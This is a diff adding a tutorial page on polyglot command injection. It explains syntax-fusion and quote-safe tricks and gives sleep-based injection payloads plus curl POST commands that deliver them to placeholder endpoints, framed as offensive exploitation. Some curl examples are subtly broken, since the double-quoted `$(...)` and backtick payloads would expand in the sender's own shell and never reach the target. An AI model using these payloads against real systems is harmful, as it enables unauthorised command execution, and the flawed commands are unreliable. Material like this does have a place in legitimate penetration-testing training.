@@ -1,0 +1,82 @@
+---
+title: Mastering Polyglot Command Injection Techniques
+description: Explore polyglot command injection to execute payloads across contexts.
+  Learn crafting and testing techniques for multi-layered systems.
+keywords:
+- polyglot payload
+- command injection
+- syntax fusion
+- multi-context injection
+- quote-safe payload
+- security
+- offensive techniques
+- input sanitization
+- context switching
+---
+
+# Polyglot Command Injection
+
+## Context
+
+Polyglot Command Injection is a sophisticated offensive technique allowing the execution of payloads across distinct syntactic contexts. The primary goal is to succeed in command injection by crafting payloads that remain effective despite the presence of context-specific filters. This technique is particularly effective in environments where input traverses varying layers, such as shell commands, web servers, and application logic, each with its parsing nuances. Before diving into polyglot command injection, one should have a solid understanding of command execution, input sanitization, and context switching.
+
+## Theory
+
+### Polyglot Payloads in Command Injection
+
+A polyglot payload is designed to execute successfully across multiple syntactic or parsing contexts. The essence of polyglot payloads lies in their ability to leverage ambiguities or overlaps within different parsing mechanisms, such as shell, web applications, or database queries. This is particularly exploitable in applications that do not consistently sanitize or parse input across all layers of interaction.
+
+### Multi-Context Injection Challenges
+
+In the realm of multi-context injections, input may navigate through several interpreters or layers before actual execution. These layers can include shells, application logic, and web servers. The challenge for attackers is crafting a payload that maintains validity and executes as intended, even when faced with transformations or partial filtering along its journey. A common oversight among developers is assuming that filtering input for a single context suffices, often neglecting the potential for cross-context execution of malicious payloads.
+
+### Polyglot Syntax Fusion Techniques
+
+Syntax fusion involves the combination of syntactic elements from various interpreters into one cohesive payload. This could include syntax from shell commands, JavaScript, or SQL. Polyglot payloads effectively bypass naive filtering by using alternate delimiters, whitespace, or comment syntax. Various shells interpret constructs like `$()`, backticks, `${IFS}` (internal field separator), and comments, providing opportunities for executing cross-syntax attacks.
+
+### Quote-Safe and Cross-Syntax Payloads
+
+Quote-safe payloads are crafted to execute irrespective of whether they are encapsulated within single or double quotes. This quality is particularly crucial in scenarios where input quoting cannot be predicted. Cross-syntax payloads capitalize on the overlapping rules within different parsing environments to persist through varying quoting or escaping mechanisms in place.
+
+## Practice
+
+### Crafting a Polyglot Payload for Command Injection
+
+- Identify the injection point and determine if input is subject to quoting or filtering. Understanding the specifics of how input is processed is critical to designing a reliable payload.
+- Example Polyglot Payload: `sleep${IFS}9`
+  - The `${IFS}` expands into a space, effectively circumventing any filters aimed at blocking spaces.
+  
+- Alternative Polyglot Payload: `/*$(sleep 5)`sleep 5`*/`
+  - This payload combines shell syntax with comments, making it valid under multiple parsing contexts.
+  
+- Quote-Safe Payload Example: `'\";sleep 5;#`
+  - This payload manages to escape both single and double quotes and comments out any subsequent characters.
+
+- Command execution via HTTP POST:
+    ```bash
+    curl -X POST -d "username=admin&password=sleep${IFS}9" http://target/login
+    ```
+  - The payload is delivered to a vulnerable endpoint, demonstrating its execution through cross-context handling.
+
+### Testing Polyglot Payloads Across Contexts
+
+- Send each crafted payload to the target application to observe response times or output, which are pivotal in confirming successful execution. Timing-based payloads, such as those employing `sleep`, can indicate whether the command was executed.
+
+- Example of testing Shell and Comment contexts:
+    ```bash
+    curl -X POST -d "input=/*$(sleep 5)`sleep 5`*/" http://target/endpoint
+    ```
+
+- Testing for Quote-Safe Execution:
+    ```bash
+    curl -X POST -d "input='\\\";sleep 5;#" http://target/endpoint
+    ```
+  - These tests help validate the payload's effectiveness across multiple scenarios, including different quoting mechanisms.
+
+## Tools
+
+- **curl**
+- **Burp Suite**
+- **ffuf**
+
+By understanding and deploying polyglot payloads, you can navigate and exploit complex, multi-layered systems, turning their assumed protections into vulnerabilities.
